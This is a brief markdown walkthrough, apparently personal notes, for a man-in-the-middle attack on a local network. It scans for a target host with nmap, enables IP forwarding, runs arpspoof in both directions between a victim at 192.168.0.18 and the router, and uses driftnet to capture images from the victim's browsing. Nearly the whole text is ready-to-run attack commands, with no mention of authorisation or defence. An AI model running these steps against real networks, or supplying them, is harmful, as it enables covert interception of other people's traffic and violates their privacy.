## Man-in-the-middle-attack


- Discover network interfaces
```bash
ifconfig
```
- network interface: wlp0s20f3:

- Discover network and default gateway

```bash
ip route show
```
- network: 192.168.0.0/24
- default gateway: 192.168.0.1


```bash
nmap 192.168.0.0/24 -sn
```
> -sn: ping scan

- target: 192.168.0.18

### enable packets forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

### intercept packages from victim with arpspoof


```bash
arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
```

> install arpspoof in ubuntu

```bash
sudo apt install dsniff
```


```bash
sudo arpspoof -i wlp0s20f3 -t 192.168.0.18 192.168.0.1    
```

### intercept packages from router with arpspoof

```bash
arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]
```

```bash
sudo arpspoof -i wlp0s20f3 -t 192.168.0.1 192.168.0.18
```


### sniff images from the victim navigation

```bash
sudo driftnet -i wlp0s20f3
```


### disable packets forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=0
```


